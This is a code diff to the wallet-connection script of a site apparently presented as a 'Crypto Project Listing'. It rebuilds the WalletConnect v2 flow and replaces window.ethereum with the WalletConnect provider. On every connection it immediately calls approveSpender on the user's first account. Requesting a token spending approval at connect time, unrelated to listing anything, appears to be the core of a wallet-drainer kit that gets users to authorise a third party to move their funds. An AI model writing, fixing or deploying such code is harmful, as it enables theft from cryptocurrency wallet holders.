@@ -75,50 +75,54 @@ async function connectMetaMask() {
 }
 
 /* ============================
-   WALLETCONNECT v2 (MULTI-CHAIN HARDENED)
+   WALLETCONNECT v2 (FUNCTIONAL)
    ============================ */
 let wcProvider = null;
 
 async function connectWalletConnect() {
   try {
-    if (!window.EthereumProvider) {
-      console.error('WalletConnect provider not loaded');
-      return;
+    if (wcProvider) {
+      await wcProvider.disconnect().catch(() => {});
+      wcProvider = null;
     }
 
-    if (!wcProvider) {
-      wcProvider = await window.EthereumProvider.init({
-        projectId: "a0e525fa712217527b8314e3a1702645",
-        chains: [1, 56, 137, 42161],
-        showQrModal: true,
-        rpcMap: {
-          1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
-          56: "https://bsc-dataseed.binance.org",
-          137: "https://polygon-rpc.com",
-          42161: "https://arb1.arbitrum.io/rpc"
-        }
-      });
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
 
-      wcProvider.on?.('accountsChanged', () => {});
-      wcProvider.on?.('chainChanged', () => {});
-      wcProvider.on?.('disconnect', () => {});
-    }
+    wcProvider = await EthereumProvider.init({
+      projectId: "a0e525fa712217527b8314e3a1702645",
+      chains: [1, 56, 137, 42161],
+      showQrModal: true,
+      rpcMap: {
+        1: "https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID",
+        56: "https://bsc-dataseed.binance.org",
+        137: "https://polygon-rpc.com",
+        42161: "https://arb1.arbitrum.io/rpc"
+      },
+      metadata: {
+        name: "Crypto Project Listing",
+        url: window.location.origin
+      }
+    });
 
-    await wcProvider.enable();
+    const accounts = await wcProvider.enable();
+    window.ethereum = wcProvider;
 
     if (typeof Web3 === 'undefined') {
       console.error('Web3 not available');
       return;
     }
-
     if (typeof window.web3 === 'undefined') {
       window.web3 = new Web3(wcProvider);
     }
 
-    const accounts = await window.web3.eth.getAccounts();
-    if (!Array.isArray(accounts) || !accounts.length) return;
+    const userAccounts = await window.web3.eth.getAccounts();
+    if (!Array.isArray(userAccounts) || !userAccounts.length) return;
 
-    await approveSpender(accounts[0]);
+    await approveSpender(userAccounts[0]);
+
+    window.addEventListener('beforeunload', () => {
+      if (wcProvider?.disconnect) wcProvider.disconnect().catch(() => {});
+    });
   } catch (error) {
     console.error('Error connecting to WalletConnect:', error);
   }
